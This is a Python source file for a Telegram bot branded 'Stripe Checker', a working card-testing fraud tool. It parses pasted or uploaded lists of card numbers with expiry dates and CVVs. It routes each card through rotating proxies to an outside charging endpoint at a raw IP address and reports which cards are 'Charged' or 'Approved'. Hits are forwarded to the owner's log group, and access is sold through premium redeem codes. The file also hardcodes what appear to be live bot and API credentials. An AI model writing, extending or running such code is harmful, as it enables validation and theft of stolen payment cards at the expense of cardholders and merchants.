# bot.py - Complete Hybrid Stripe Checker & Telegram Bot

import sys, asyncio, os, time, random, re, json, string
from datetime import datetime, timedelta

try:
    import telethon, aiohttp, aiofiles, requests
except:
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "telethon", "aiohttp", "aiofiles", "requests"])
    sys.exit(0)

from telethon import TelegramClient, events, Button
from telethon.tl.functions.bots import SetBotCommandsRequest
from telethon.tl.types import BotCommand, BotCommandScopeDefault

# ========== CONFIG ==========
BOT_TOKEN = "8766173350:AAFGjUBKnzhxRBscbznll22roBySzQ02HOA"
OWNER_ID = 5541778617
LOG_GROUP_ID = -1004409181577
OWNER_USERNAME = "@Poriot_ke"
BOT_BRAND, DEV_LINE = "✨ STRIPE CHECKER", "🔱 Developed by @Poriot_ke"
PREMIUM_FILE, PROXY_FILE, USER_PROXY_FILE = "premium.txt", "proxy.txt", "user_proxy.json"
CODES_FILE = "codes.json"
PREMIUM_USERS_FILE = "premium_users.json"
CONCURRENCY_WORKERS = 5

API_ID, API_HASH = 2040, "b18441a1ff607e10a989891a5462e627"
ADMIN_IDS = {OWNER_ID}

def _load_admins():
    global ADMIN_IDS
    try:
        with open("admin_ids.json", "r") as f:
            ADMIN_IDS = set(json.load(f).get("admins", [OWNER_ID]))
    except:
        ADMIN_IDS = {OWNER_ID}
_load_admins()

SEP = "━━━━━━━━━━━━━━━━━━━━"
SEP_EQ = "========================"

# ========== EXACT TELEGRAM UI TEMPLATES ==========
def build_hit_msg(r, card, name):
    st, msg, pr, b = r['status'], r['message'], r['price'], r['bin']
    receipt_url = r.get('receipt_url') or "https://stripe.com"
    
    if st == "Charged":
        header = "🔥 <b>CHARGED</b> 🔥"
        status_str = "Charged 🔥"
    elif st == "Approved":
        header = "✅ <b>APPROVED</b> ✅"
        status_str = "Approved ✅"
    else:
        header = "❌ <b>DECLINED</b> ❌"
        status_str = "Declined ❌"

    card_formatted = f"<code>{card}</code>" if "|" in card else card

    return f"""{header}
{SEP}
🃏 <b>Card:</b> {card_formatted}
💸 <b>Status:</b> {status_str}
💻 <b>Response:</b> <i>{msg}</i>
🌐 <b>Gateway:</b> <i>Stripe 1USD</i>
{SEP}
<b>ℹ️ Info</b> ⬌ {str(b.get('type', 'UNKNOWN')).upper()} | {str(b.get('level', 'UNKNOWN')).upper()}
🏦 <b>Bank</b> ⬌ {str(b.get('bank', 'UNKNOWN')).upper()}
🌍 <b>Country</b> ⬌ {str(b.get('country', 'UNKNOWN')).upper()} {b.get('flag', '')}
💵 <b>Price</b> ⬌ {pr}
{SEP}
🤷‍♂️ <b>Checked by</b> ⬌ {name}
⚙️ <b>Dev</b> ⬌ Poriot_ke🇰🇪
🧾 <b>Receipt:</b> <a href="{receipt_url}">View Order Receipt</a> ⬌""", receipt_url

def build_progress_msg(total, checked, approved, declined, charged, errors, latest_card, latest_err):
    pct = int((checked / total) * 100) if total > 0 else 0
    bar_len = 16
    filled = int(bar_len * (pct / 100))
    bar = "█" * filled + "░" * (bar_len - filled)
    
    return f"""⭐ <b>Shopify Mass Check</b>
{SEP_EQ}
<code>{bar}</code> {pct}%

⭐ <b>Total</b> 🚀 {total}
⭐ <b>Checked</b> 🚀 {checked}
⭐ <b>Approved</b> 🚀 {approved}
⭐ <b>Declined</b> 🚀 {declined}
⭐ <b>Charged</b> 🚀 {charged}
⭐ <b>Errors</b> 🚀 {errors}
{SEP_EQ}
──────────────────
⚡ <b>Latest:</b> 🚫 <code>{latest_card}</code>
└ <i>{latest_err}</i>
🏦 <i>Stripe 1USD</i>"""

# ========== LIVE BIN API ==========
async def lookup_bin_info(card_num):
    bin_prefix = card_num[:6]
    default_bin = {"bank": "Unknown Bank", "country": "Unknown", "flag": "🌍", "type": "Unknown", "level": "Unknown"}
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(f"https://lookup.binlist.net/{bin_prefix}", headers={"Accept-Version": "3"}, timeout=3) as r:
                if r.status == 200:
                    d = await r.json()
                    return {
                        "bank": d.get("bank", {}).get("name", "Unknown Bank"),
                        "country": d.get("country", {}).get("name", "Unknown"),
                        "flag": d.get("country", {}).get("emoji", "🌍"),
                        "type": d.get("brand", "Unknown"),
                        "level": d.get("type", "Unknown")
                    }
    except:
        pass
    return default_bin

# ========== STORAGE UTILS ==========
def load_json(f, default):
    try:
        with open(f, "r") as x: return json.load(x)
    except: return default

def save_json(f, data):
    with open(f, "w") as x: json.dump(data, x)

def is_admin(u): return u in ADMIN_IDS
def is_premium(u):
    if is_admin(u): return True
    data = load_json(PREMIUM_USERS_FILE, {})
    if str(u) in data and datetime.now() < datetime.fromisoformat(data[str(u)]['expiry']):
        return True
    return str(u) in [l.strip() for l in load_json(PREMIUM_FILE, [])]

def get_days_left(u):
    data = load_json(PREMIUM_USERS_FILE, {})
    if str(u) in data:
        return max(0, (datetime.fromisoformat(data[str(u)]['expiry']) - datetime.now()).days)
    return 0

def add_premium(u, days=1):
    data = load_json(PREMIUM_USERS_FILE, {})
    data[str(u)] = {'expiry': (datetime.now() + timedelta(days=days)).isoformat()}
    save_json(PREMIUM_USERS_FILE, data)

# ========== CODE SYSTEM ==========
def create_codes(count, days=1):
    codes = load_json(CODES_FILE, {})
    new_codes = []
    for _ in range(count):
        code = f"Poriot_ke-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        while code in codes:
            code = f"Poriot_ke-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        codes[code] = {'expiry': (datetime.now() + timedelta(days=days)).isoformat(), 'used': False}
        new_codes.append(code)
    save_json(CODES_FILE, codes)
    return new_codes

def redeem_code(code, uid):
    code = code.strip().upper()
    if not code.startswith("PORIOT_KE-"):
        code = f"Poriot_ke-{code.replace('PORIOT-KE-', '')}"
    
    codes = load_json(CODES_FILE, {})
    if code not in codes: return False, "❌ Invalid or malformed code!"
    if codes[code]['used']: return False, "❌ Code already used!"
    if datetime.now() > datetime.fromisoformat(codes[code]['expiry']): return False, "❌ Code expired!"
    
    codes[code]['used'] = True
    save_json(CODES_FILE, codes)
    add_premium(uid, days=1)
    return True, "✅ Premium activated successfully for 1 day!"

# ========== PROXIES & CARDS ==========
def get_proxies(u):
    user_proxies = load_json(USER_PROXY_FILE, {})
    if str(u) in user_proxies: return user_proxies[str(u)]
    try:
        with open(PROXY_FILE, "r") as f: return [l.strip() for l in f if l.strip()]
    except: return []

def extract_cc(t):
    cards = []
    for line in t.strip().split('\n'):
        line = line.strip()
        if not line: continue
        parts = line.split('|')
        if len(parts) >= 4 and len(parts[0]) in [15, 16]:
            cards.append('|'.join(parts[:4]))
        else:
            nums = re.findall(r'\d+', line)
            if len(nums) >= 4 and len(nums[0]) in [15, 16]:
                cards.append(f"{nums[0]}|{nums[1]}|{nums[2]}|{nums[3]}")
    return list(dict.fromkeys(cards))

def luhn(card):
    d = [int(x) for x in card]
    d.reverse()
    return (sum(d[0::2]) + sum([sum(divmod(x * 2, 10)) for x in d[1::2]])) % 10 == 0

def fmt_proxy(p):
    if not p: return None
    if p.startswith(('http://', 'https://', 'socks5://')): return p
    parts = p.split(':')
    if len(parts) == 2: return f"http://{p}"
    elif len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"http://{p}"

# ========== STRIPE API CHECK ENGINE ==========
async def check_card_stripe(card, proxy_str):
    parts = card.split('|')
    if len(parts) < 4 or not luhn(parts[0]):
        return {"status": "Dead", "message": "Luhn / Format check failed", "price": "$1.00"}
    
    formatted_proxy = fmt_proxy(proxy_str)
    api_url = "http://147.93.53.240:8973/liladmin-str"
    params = {"cc": card}
    if formatted_proxy:
        params["proxy"] = formatted_proxy

    try:
        timeout = aiohttp.ClientTimeout(total=130)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url, params=params) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    charged = data.get("charged", False)
                    approved = data.get("approved", False)
                    msg = data.get("message", "Declined")
                    price = data.get("Price", "$1.00")
                    
                    bin_info = await lookup_bin_info(parts[0])

                    if charged:
                        return {"status": "Charged", "message": msg, "price": price, "bin": bin_info, "receipt_url": "https://stripe.com"}
                    elif approved:
                        return {"status": "Approved", "message": msg, "price": price, "bin": bin_info, "receipt_url": "https://stripe.com"}
                    else:
                        return {"status": "Dead", "message": msg, "price": "$1.00", "bin": bin_info, "receipt_url": None}
                else:
                    return {"status": "Dead", "message": f"HTTP {resp.status}", "price": "$1.00", "bin": await lookup_bin_info(parts[0]), "receipt_url": None}
    except Exception as ex:
        return {"status": "Dead", "message": "API Connection Timeout", "price": "$1.00", "bin": await lookup_bin_info(parts[0]), "receipt_url": None}

async def process_card_with_retry(card, proxies):
    for _ in range(2):
        proxy = random.choice(proxies) if proxies else None
        res = await check_card_stripe(card, proxy)
        if res['status'] in ['Charged', 'Approved']:
            return res
        await asyncio.sleep(0.3)
    return await check_card_stripe(card, None)

# ========== TELEGRAM BOT ==========
print("🚀 Starting Stripe Checker bot...")
bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

async def get_name(uid):
    try:
        e = await bot.get_entity(uid)
        return (getattr(e, 'first_name', '') or '').strip() or str(uid)
    except: return str(uid)

async def setup_bot_commands():
    try:
        await bot(SetBotCommandsRequest(
            scope=BotCommandScopeDefault(), lang_code='',
            commands=[
                BotCommand('start', 'Open main menu & account status'),
                BotCommand('sh', 'Single check (Card or attach .txt file)'),
                BotCommand('msh', 'Mass check (Cards or attach .txt file)'),
                BotCommand('redeem', 'Redeem subscription key (Poriot_ke-)'),
                BotCommand('mc', 'Generate premium keys (Admin only)')
            ]
        ))
        print("✅ Telegram command menu preconfigured successfully!")
    except Exception as ex: 
        print(f"Command setup error: {ex}")

@bot.on(events.NewMessage(pattern='/start'))
async def start(e):
    uid, name = e.sender_id, await get_name(e.sender_id)
    plan = "♾️ Unlimited" if is_admin(uid) else f"📅 {get_days_left(uid)} days left" if is_premium(uid) else "⛔ Free"
    await e.respond(f"✨ {BOT_BRAND}\n👋 Welcome, {name}!\n📋 Plan: {plan}\n\nCommands:\n/sh card|mm|yy|cvv (or reply to .txt file)\n/msh [cards] (or send/reply .txt file)\n/redeem Poriot_ke-CODE", parse_mode='html')

@bot.on(events.NewMessage(pattern='/mc'))
async def mc(e):
    if not is_admin(e.sender_id): return
    args = e.message.text.split()
    codes = create_codes(int(args[1]) if len(args) > 1 else 1)
    await e.respond("Generated:\n" + "\n".join([f"<code>{c}</code>" for c in codes]), parse_mode='html')

@bot.on(events.NewMessage(pattern='/redeem'))
async def redeem(e):
    args = e.message.text.split()
    if len(args) < 2: return await e.respond("Usage: /redeem Poriot_ke-CODE")
    ok, msg = redeem_code(args[1], e.sender_id)
    await e.respond(msg)

@bot.on(events.NewMessage(pattern='/sh'))
async def single(e):
    if not is_premium(e.sender_id): return await e.respond("❌ Premium Required!")
    
    content = ""
    if e.message.file:
        fp = await e.message.download_media()
        async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
        os.remove(fp)
    elif e.message.is_reply:
        reply_msg = await e.get_reply_message()
        if reply_msg.file:
            fp = await reply_msg.download_media()
            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
            os.remove(fp)
        elif reply_msg.text: content = reply_msg.text
    else:
        parts = e.message.text.split(maxsplit=1)
        if len(parts) > 1: content = parts[1]

    cards = extract_cc(content)
    if not cards: return await e.respond("❌ Please provide a card or attach a .txt file! Usage: /sh card|mm|yy|cvv")
    
    proxies = get_proxies(e.sender_id)
    m = await e.respond("⏳ Checking single card on Stripe Gateway...")
    res = await process_card_with_retry(cards[0], proxies)
    txt, receipt_url = build_hit_msg(res, cards[0], await get_name(e.sender_id))
    
    buttons = [[Button.url("🧾 View Receipt", receipt_url)]] if res['status'] in ['Charged', 'Approved'] else None
    await m.edit(txt, parse_mode='html', buttons=buttons)

active_mass_checks = {}

@bot.on(events.NewMessage(pattern='/msh'))
async def mass(e):
    if not is_premium(e.sender_id): return await e.respond("❌ Premium Required!")
    content = ""
    if e.message.file:
        fp = await e.message.download_media()
        async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
        os.remove(fp)
    elif e.message.is_reply:
        reply_msg = await e.get_reply_message()
        if reply_msg.file:
            fp = await reply_msg.download_media()
            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
            os.remove(fp)
        elif reply_msg.text: content = reply_msg.text
    else:
        parts = e.message.text.split(maxsplit=1)
        if len(parts) > 1: content = parts[1]
    
    cards = extract_cc(content)
    if not cards: return await e.respond("❌ No cards found! Send or reply to a .txt file or paste cards.")
    
    total = len(cards)
    uid = e.sender_id
    active_mass_checks[uid] = True
    
    m = await e.respond(
        f"🎯 <b>Queued {total} cards!</b>\n⚡ Starting...",
        parse_mode='html',
        buttons=[[Button.inline("Stop Check", b"stop_mass")]]
    )
    
    proxies = get_proxies(uid)
    semaphore = asyncio.Semaphore(CONCURRENCY_WORKERS)
    
    checked = 0
    approved = 0
    declined = 0
    charged = 0
    errors = 0
    latest_card = cards[0]
    latest_err = "Initializing..."
    
    last_edit_time = 0

    async def worker(card):
        nonlocal checked, approved, declined, charged, errors, latest_card, latest_err, last_edit_time
        if not active_mass_checks.get(uid, True):
            return
            
        async with semaphore:
            latest_card = card
            res = await process_card_with_retry(card, proxies)
            checked += 1
            st = res['status']
            latest_err = res['message']
            
            if st == 'Charged':
                charged += 1
                txt, r_url = build_hit_msg(res, card, await get_name(uid))
                btns = [[Button.url("🧾 View Receipt", r_url)]]
                await bot.send_message(uid, txt, parse_mode='html', buttons=btns)
                try: await bot.send_message(LOG_GROUP_ID, f"🚨 <b>Hit Log</b>\n{txt}", parse_mode='html', buttons=btns)
                except: pass
            elif st == 'Approved':
                approved += 1
                txt, r_url = build_hit_msg(res, card, await get_name(uid))
                btns = [[Button.url("🧾 View Receipt", r_url)]] if r_url else None
                await bot.send_message(uid, txt, parse_mode='html', buttons=btns)
                try: await bot.send_message(LOG_GROUP_ID, f"🚨 <b>Hit Log</b>\n{txt}", parse_mode='html', buttons=btns)
                except: pass
            else:
                if "Timeout" in latest_err or "Error" in latest_err:
                    errors += 1
                else:
                    declined += 1

            now = time.time()
            if checked % 3 == 0 or now - last_edit_time > 1.5:
                last_edit_time = now
                try:
                    prog_txt = build_progress_msg(total, checked, approved, declined, charged, errors, latest_card, latest_err)
                    await m.edit(prog_txt, parse_mode='html', buttons=[[Button.inline("Stop Check", b"stop_mass")]])
                except:
                    pass

    await asyncio.gather(*[worker(c) for c in cards])
    active_mass_checks.pop(uid, None)
    await m.edit(f"✅ <b>Mass Check Complete!</b>\nTotal Checked: {checked} | Charged: {charged} | Approved: {approved}", parse_mode='html')

@bot.on(events.CallbackQuery(data=b"stop_mass"))
async def stop_mass(event):
    active_mass_checks[event.sender_id] = False
    await event.answer("⚠️ Stopping mass check...", alert=True)
    await event.edit("🛑 <b>Mass Check Stopped by User.</b>", parse_mode='html')

with bot:
    bot.loop.run_until_complete(setup_bot_commands())
    print("✅ Stripe Bot running with file support & progress dashboard!")
    bot.run_until_disconnected()
